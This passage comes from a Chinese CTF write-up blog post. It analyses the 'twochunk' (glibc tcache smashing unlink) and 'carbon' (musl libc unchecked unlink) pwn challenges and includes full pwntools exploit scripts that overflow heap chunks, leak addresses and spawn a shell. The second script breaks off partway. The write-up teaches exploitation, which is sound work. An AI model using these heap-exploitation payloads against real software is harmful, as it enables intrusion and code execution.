data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/14.png"></div><p><strong>create</strong>:只能有两个chunk能被同时创建，两个分配方式：calloc和malloc。malloc有两次，分别是0x100和0x90两个大小，calloc次数没有限制，size限制在0x90~0x410，还有一个点是不允许通过malloc创建的chunk中带有0x7f，那么就无法通过脏数据来泄露libc了。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/15.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/16.png"></div><p><strong>show</strong>只能一次，打印八个字节。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/17.png"></div><p><strong>edit</strong>只能一次，溢出0x20个字节</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/18.png"></div><p><strong>showMessage</strong>打印出0x2333000处的name和info，同样只有一次机会。</p><p><strong>delete</strong>没有漏洞</p><p><strong>backdoor</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/19.png"></div><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>想了一会儿经过尝试之后大概想到就是利用tcache smashing unlink攻击了。</p><p>具体内容是这样：<br>1.首先利用两个不同的大chunk，分别填满tcache进入unsorted bin中切出0x90的chunk，这里比较重要一点是其中一个链的chunk大小需要是0x90+0x100=0x190，因为我们需要利用一次0x100的分配来溢出第二个进入smalllbin的0x90的chunk，改写bk</p><p>2.在第二个0x90的chunk还在unsorted bin的时候利用malloc(0xe9)的那次机会，将0x90的chunk归类入smallbin中，show出heap地址，同时改写bk为victim-0x10。一举三得。</p><p>3.calloc(0x88)来进行tcache smashing unlink攻击，这个时候victim地址就进入tcache了（这里需要注意一点，我们在一开始写name和info的时候需要在对应位置写合法地址，以方便后面归类的时候需要赋值，这个时候合法地址只有0x2333000后面的地址）</p><p>4.使用leave_message的一次机会，控制mmap地址，写system和/bin/sh，调用后门函数即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># encoding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>file_path <span class="token operator">=</span> <span class="token string">"./twochunk"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/lib/x86_64-linux-gnu/libc-2.29.so'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_message_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leave_end_message</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"end message: "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">call_mmap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">)</span>mmap_addr <span class="token operator">=</span> <span class="token number">0x23333000</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>mmap_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"message: "</span><span class="token punctuation">,</span><span class="token string">"pwn the process"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x140</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x140</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x108</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x180</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x180</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># above of the last 0x90 chunk</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># make the split 0x90 chunk in smallbin</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x5B25</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 0x100 chunk leak heap and overflow</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x000055555555a160</span><span class="token operator">+</span><span class="token number">0x555555559000</span>success<span class="token punctuation">(</span><span class="token string">"heap address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x000055555555a310</span><span class="token operator">-</span><span class="token number">0x555555559000</span><span class="token operator">+</span>heap_base<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mmap_addr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>show_message_name<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x15</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7fb2d20</span><span class="token operator">+</span><span class="token number">0x7ffff7dce000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>leave_end_message<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mmap_addr<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>call_mmap<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/20.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/21.png"></div>我们看到这个并非之前的glibc，而是musl-libc。那么其heap管理跟以前做的就有区别<h2 id="IDA分析-3"><a href="#IDA分析-3" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/22.png"></div>create函数 <div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/23.png"></div>edit无限制次数，show需要根据bss段上的一个参数来执行（执行完加一，为0执行）## 源码阅读两个关键点：<p>第一个malloc的时候，libc地址会写到fd和bk。同时malloc(0)的时候会malloc一个0x20的chunk。chunk是以0x20为一个最小单位增加的。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/24.png"></div>跟进：看到直接加上0x20的大小，那么n = 0时，会分配0x20的chunk，用这个漏洞可以泄露heap，因为read可以根据输入的size读取。也就是先分配0x0chunk，同时不写入内容，show就可以得到heap地址<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/25.png"></div>第二个：free的时候，unlink没有检查：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/26.png"></div>跟进：unlink的位置<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/27.png"></div>那我们就可以任意地址写入了。unlink的目标简单的说就是控制heap list。或者是将heap_list改为got，或者改为自己创造的fake heap_list的地址。这样就可以任意编辑泄露了。<pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x602040</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_list_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0x602040是存放heap_list的地址</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span>overflow<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下：<br>0x602040 = fake_list_addr<br>fake_list_addr + 0x10 = 0x602028</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/28.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/29.png"></div><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>第一步：malloc一个0x0的chunk（实际上是0x20）show(0)获得heap地址。<br>第二步：找到伪造fake_list的地址，写入到unlink的目标：p64(存储heap_list的地址) + p64(fake_heap_list_addr)<br>第三步：控制heap_list了，就可以泄露、再编辑heap_list了。注意之前要把bss段上判断show的地址和fake_heap_list_addr写入到fake_heap_list中<br>第四步：利用environ泄露ret地址，rop来getshell</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>DEBUG <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>BIN_PATH <span class="token operator">=</span> <span class="token string">'./carbon'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>BIN_PATH<span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token keyword">if</span> DEBUG <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span>BIN_PATH<span class="token punctuation">)</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">'amd64'</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so'</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'119.3.158.103'</span><span class="token punctuation">,</span><span class="token number">19008</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so'</span><span class="token punctuation">)</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">,</span>overflow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'size? >'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> overflow<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">'believer? >'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">'believer? >'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">'sleeve >'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'ID? >'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'ID? >'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'ID? >'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_route</span><span class="token punctuation">(</span>s_id<span class="token punctuation">,</span>d_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'---> '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'Source Station ID: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>s_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'Target Station ID: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>d_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># 获得heap地址</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> data <span class="token operator">+</span> <span class="token 